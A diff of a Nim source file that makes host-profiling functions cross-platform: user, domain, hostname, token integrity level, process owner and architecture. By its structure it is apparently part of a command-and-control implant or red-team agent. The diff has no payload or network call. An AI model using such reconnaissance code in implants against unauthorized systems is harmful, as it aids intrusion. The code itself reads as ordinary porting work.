@@ -1,11 +1,13 @@
 import  std/options
 from os import getCurrentProcessId, getEnv, extractFilename, getCurrentDir
 import std/net
-import winim/lean
 import strutils
 import json
 import structs
 import config
+
+when defined(windows):
+  import winim/lean
 
 
 
@@ -15,7 +17,8 @@ template DBG*(msg: string) =
 
 
 # Separate Windows API Function Definitions
-proc IsWow64Process2(hProcess: HANDLE, pProcessMachine: PUSHORT, pNativeMachine: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}
+when defined(windows):
+  proc IsWow64Process2(hProcess: HANDLE, pProcessMachine: PUSHORT, pNativeMachine: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}
 
 
 
@@ -116,82 +119,99 @@ proc getLocalIP*(): string =
 
 # Returns the current User
 proc getUser*(): string =
-  return getEnv("USERNAME")
+  when defined(windows):
+    return getEnv("USERNAME")
+  else:
+    return getEnv("USER")
 
 
 # Return the current Domain
 proc getDomain*(): string =
-  return getEnv("USERDOMAIN")
+  when defined(windows):
+    return getEnv("USERDOMAIN")
+  else:
+    return ""
 
 
 proc getHost*(): string =
-  return getEnv("COMPUTERNAME")
+  when defined(windows):
+    return getEnv("COMPUTERNAME")
+  else:
+    let h = getHostname()
+    return if h.len > 0: h else: "localhost"
 
 
 # Return the Process Integrity
 # Level of the currently running process
 proc getIntegrityLevel*(hProcess: HANDLE): int =
+  when not defined(windows):
+    return 2
 
-  var
-    status: BOOL
-    procToken: HANDLE
-    tokenInfoLen: DWORD
-    tokenInfo: PTOKEN_MANDATORY_LABEL
-    hProc: HANDLE
-
-  # if its 0, take the own process,
-  # otherwise take the supplied one
-  if hProcess == 0:
-    hProc = GetCurrentProcess()
   else:
-    hProc = hProcess
 
-  # open the process with TOKEN_QUERY
-  status = OpenProcessToken(hProc, TOKEN_QUERY, addr procToken)
+    var
+      status: BOOL
+      procToken: HANDLE
+      tokenInfoLen: DWORD
+      tokenInfo: PTOKEN_MANDATORY_LABEL
+      hProc: HANDLE
+
+    # if its 0, take the own process,
+    # otherwise take the supplied one
+    if hProcess == 0:
+      hProc = GetCurrentProcess()
+    else:
+      hProc = hProcess
+
+    # open the process with TOKEN_QUERY
+    status = OpenProcessToken(hProc, TOKEN_QUERY, addr procToken)
 
 
-  # Get the Length and then the actual output value
-  status = GetTokenInformation(procToken, tokenIntegrityLevel, addr tokenInfo, 0, addr tokenInfoLen)
+    # Get the Length and then the actual output value
+    status = GetTokenInformation(procToken, tokenIntegrityLevel, addr tokenInfo, 0, addr tokenInfoLen)
 
-  if status == FALSE and cast[int](GetLastError()) != 122:
-    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
-    return 1
+    if status == FALSE and cast[int](GetLastError()) != 122:
+      DBG("[-] GetTokenInformation() failed: " & $GetLastError())
+      return 1
 
-  # Allocate Memory for the struct
-  tokenInfo = cast[PTOKEN_MANDATORY_LABEL](alloc(tokenInfoLen))
-  status = GetTokenInformation(procToken, tokenIntegrityLevel, tokenInfo, tokenInfoLen, addr tokenInfoLen)
+    # Allocate Memory for the struct
+    tokenInfo = cast[PTOKEN_MANDATORY_LABEL](alloc(tokenInfoLen))
+    status = GetTokenInformation(procToken, tokenIntegrityLevel, tokenInfo, tokenInfoLen, addr tokenInfoLen)
 
-  if status == FALSE:
-    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
-    return 1
+    if status == FALSE:
+      DBG("[-] GetTokenInformation() failed: " & $GetLastError())
+      return 1
 
-  var integrityLevel = GetSidSubAuthority(
-    tokenInfo.Label.Sid,
-    cast[DWORD](GetSidSubAuthorityCount(tokenInfo.Label.Sid)[]) - 1
-  )
+    var integrityLevel = GetSidSubAuthority(
+      tokenInfo.Label.Sid,
+      cast[DWORD](GetSidSubAuthorityCount(tokenInfo.Label.Sid)[]) - 1
+    )
 
-  if integrityLevel[] < SECURITY_MANDATORY_LOW_RID:
-    return 0 # UNTRUSTED
-  if integrityLevel[] < SECURITY_MANDATORY_MEDIUM_RID:
-    return 1 # LOW
-  if integrityLevel[] >= SECURITY_MANDATORY_MEDIUM_RID and integrityLevel[] < SECURITY_MANDATORY_HIGH_RID:
-    return 2 # MEDIUM
-  if integrityLevel[] >= SECURITY_MANDATORY_HIGH_RID and integrity_level[] < SECURITY_MANDATORY_SYSTEM_RID:
-    return 3 # HIGH
-  if integrityLevel[] >= SECURITY_MANDATORY_SYSTEM_RID:
-    return 4 # HIGH
+    if integrityLevel[] < SECURITY_MANDATORY_LOW_RID:
+      return 0 # UNTRUSTED
+    if integrityLevel[] < SECURITY_MANDATORY_MEDIUM_RID:
+      return 1 # LOW
+    if integrityLevel[] >= SECURITY_MANDATORY_MEDIUM_RID and integrityLevel[] < SECURITY_MANDATORY_HIGH_RID:
+      return 2 # MEDIUM
+    if integrityLevel[] >= SECURITY_MANDATORY_HIGH_RID and integrity_level[] < SECURITY_MANDATORY_SYSTEM_RID:
+      return 3 # HIGH
+    if integrityLevel[] >= SECURITY_MANDATORY_SYSTEM_RID:
+      return 4 # HIGH
 
-  # default, return UNTRUSTED
-  return 0
+    # default, return UNTRUSTED
+    return 0
 
 
 # Get current process name
 proc getProcessName*(): string =
-  var fullProcname: LPSTR = cast[LPSTR](alloc(256))
-  var pathLen: DWORD = 256
+  when defined(windows):
+    var fullProcname: LPSTR = cast[LPSTR](alloc(256))
+    var pathLen: DWORD = 256
 
-  QueryFullProcessImageNameA(GetCurrentProcess(), PROCESS_NAME_NATIVE, fullProcname, addr pathLen)
-  return extractFilename($cast[cstring](fullProcname))
+    QueryFullProcessImageNameA(GetCurrentProcess(), PROCESS_NAME_NATIVE, fullProcname, addr pathLen)
+    return extractFilename($cast[cstring](fullProcname))
+  else:
+    return extractFilename(getAppFilename())
 
 
 #[
@@ -200,21 +220,33 @@ proc getProcessName*(): string =
   bit
 ]#
 proc getArchitecture*(hProc: HANDLE): string =
+  when defined(windows):
+    var isWOW64: USHORT
+    if IsWow64Process2(hProc, addr isWOW64, NULL) == FALSE:
+      return ""
 
-  var isWOW64: USHORT
-  if IsWow64Process2(hProc, addr isWOW64, NULL) == FALSE:
-    return ""
-
-  if isWOW64 == IMAGE_FILE_MACHINE_UNKNOWN:
-    return "x64"
-  elif isWOW64 == IMAGE_FILE_MACHINE_I386:
-    return "x86"
+    if isWOW64 == IMAGE_FILE_MACHINE_UNKNOWN:
+      return "x64"
+    elif isWOW64 == IMAGE_FILE_MACHINE_I386:
+      return "x86"
+    else:
+      return "x86"
   else:
-    return "x86"
+    when defined(amd64):
+      return "x64"
+    elif defined(i386):
+      return "x86"
+    elif defined(arm64):
+      return "arm64"
+    else:
+      return "unknown"
 
 # reads string from memory
 # into nim string
 proc toString*(chars: openArray[WCHAR]): string =
+  when not defined(windows):
+    return ""
+  else:
     result = ""
     for c in chars:
         if cast[char](c) == '\0':
@@ -228,54 +260,61 @@ proc toString*(chars: openArray[WCHAR]): string =
   parsing the Sid Entries of that process
 ]#
 proc getProcessOwner*(hProc: HANDLE): string =
+  when not defined(windows):
+    let user = getUser()
+    if user.len > 0:
+      return user
+    return "unknown"
 
-  var
-    hTok: HANDLE
-    status: BOOL
-    pTokenUser: PTOKEN_USER
-    bufLen: DWORD
-    userName: LPSTR = cast[LPSTR](alloc(256))
-    domain: LPSTR = cast[LPSTR](alloc(256))
-    sidType: SID_NAME_USE
+  else:
 
-  status = OpenProcessToken(hProc, TOKEN_QUERY, addr hTok)
+    var
+      hTok: HANDLE
+      status: BOOL
+      pTokenUser: PTOKEN_USER
+      bufLen: DWORD
+      userName: LPSTR = cast[LPSTR](alloc(256))
+      domain: LPSTR = cast[LPSTR](alloc(256))
+      sidType: SID_NAME_USE
 
-  # if it fails, return an empty string
-  if status == FALSE:
-    DBG("[-] OpenProcessToken() failed: " & $GetLastError())
-    return ""
+    status = OpenProcessToken(hProc, TOKEN_QUERY, addr hTok)
 
-  if hTok == 0:
-    return ""
+    # if it fails, return an empty string
+    if status == FALSE:
+      DBG("[-] OpenProcessToken() failed: " & $GetLastError())
+      return ""
 
-  status = GetTokenInformation(hTok, tokenUser, pTokenUser, 0, addr bufLen)
+    if hTok == 0:
+      return ""
 
-  if status == FALSE and cast[int](GetLastError()) != 122:
-    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
-    return ""
+    status = GetTokenInformation(hTok, tokenUser, pTokenUser, 0, addr bufLen)
 
-
-
-  pTokenUser = cast[PTOKEN_USER](alloc(bufLen))
-  status = GetTokenInformation(hTok, tokenUser, pTokenUser, bufLen, addr bufLen)
-  if status == FALSE:
-    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
-    return ""
-
-  DBG("[+] GetTokenInformation() success")
+    if status == FALSE and cast[int](GetLastError()) != 122:
+      DBG("[-] GetTokenInformation() failed: " & $GetLastError())
+      return ""
 
 
-  var userNameLen: DWORD = 256
-  var domainLen: DWORD = 256
 
-  status = LookupAccountSidA(NULL, pTokenUser.User.Sid, userName, addr userNameLen, domain, addr domainLen, addr sidType)
+    pTokenUser = cast[PTOKEN_USER](alloc(bufLen))
+    status = GetTokenInformation(hTok, tokenUser, pTokenUser, bufLen, addr bufLen)
+    if status == FALSE:
+      DBG("[-] GetTokenInformation() failed: " & $GetLastError())
+      return ""
 
-  if status == FALSE:
-    DBG("[-] LookupAccountSidA() failed: " & $GetLastError())
-    return ""
+    DBG("[+] GetTokenInformation() success")
 
-  # return the final user in the form of `DOMAIN\USER`
-  return $(cast[cstring](domain)) & "\\" & $(cast[cstring](userName))
+
+    var userNameLen: DWORD = 256
+    var domainLen: DWORD = 256
+
+    status = LookupAccountSidA(NULL, pTokenUser.User.Sid, userName, addr userNameLen, domain, addr domainLen, addr sidType)
+
+    if status == FALSE:
+      DBG("[-] LookupAccountSidA() failed: " & $GetLastError())
+      return ""
+
+    # return the final user in the form of `DOMAIN\USER`
+    return $(cast[cstring](domain)) & "\\" & $(cast[cstring](userName))
 
 
 #[
